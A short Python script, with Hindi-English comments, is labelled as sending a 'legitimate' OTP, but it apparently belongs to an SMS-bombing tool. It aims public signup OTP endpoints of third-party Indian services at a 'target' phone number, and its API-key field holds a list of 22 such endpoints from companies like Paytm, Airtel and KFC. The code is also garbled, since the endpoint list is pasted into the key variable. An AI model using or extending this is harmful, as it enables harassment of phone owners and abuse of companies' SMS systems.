import requests
import json

def send_legitimate_otp(mobile_number, api_key):
    # Yeh URL aapke SMS Provider ka hona chahiye (Example:ConfirmTkt, JustDial, Allen Solly, etc.)
    # Note: Public websites (JustDial etc.) ka URL yahan kaam nahi karega.
    url = "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}"
    
    # Payload aapke provider ke documentation ke hisaab se hoga
    payload = {
        "route": "otp",
        "variables_values": "123456",  # Generated OTP
        "numbers": mobile_number,
    }
    
    headers = {
        "authorization": api_key,  # Aapki API Key yahan aayegi
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        
        if response.status_code == 200:
            print(f"Success! OTP sent to {mobile_number}")
            print("Response:", response.text)
        else:
            print(f"Failed. Status Code: {response.status_code}")
            print("Error:", response.text)
            
    except Exception as e:
        print(f"Connection Error: {e}")

# Usage
if __name__ == "__main__":
    my_api_key = "1.https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=
2.https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=
3.https://www.allensolly.com/capillarylogin/validateMobileOrEMail
 4.https://www.frotels.com/appsendsms.php 
5. https://www.gapoon.com/userSignup
6. https://login.housing.com/api/v2/send-otp
7. https://porter.in/restservice/send_app_link_sms 
8.https://cityflo.com/website-app-download-link-sms/
9.https://api.nnnow.com/d/api/appDownloadLink 
10.https://login.web.ajio.com/api/auth/signupSendOTP 
11.https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20 
12.https://unacademy.com/api/v1/user/get_app_link/
13.https://www.treebo.com/api/v2/auth/login/otp/  
14.https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=
15.https://pharmeasy.in/api/auth/requestOTP 
16.https://www.mylescars.com/usermanagements/chkContact 
17.https://grofers.com/v2/accounts/
18. https://api.dream11.com/sendsmslink 
19.https://www.cashify.in/api/cu01/v1/app-link?mn= 
20.https://commonfront.paytm.com/v4/api/sendsms 
21.https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin 
22.https://indialends.com/internal/a/mobile-verification_v2.ashx"
    target_number = "9998887776"
    
    send_legitimate_otp(target_number, my_api_key)
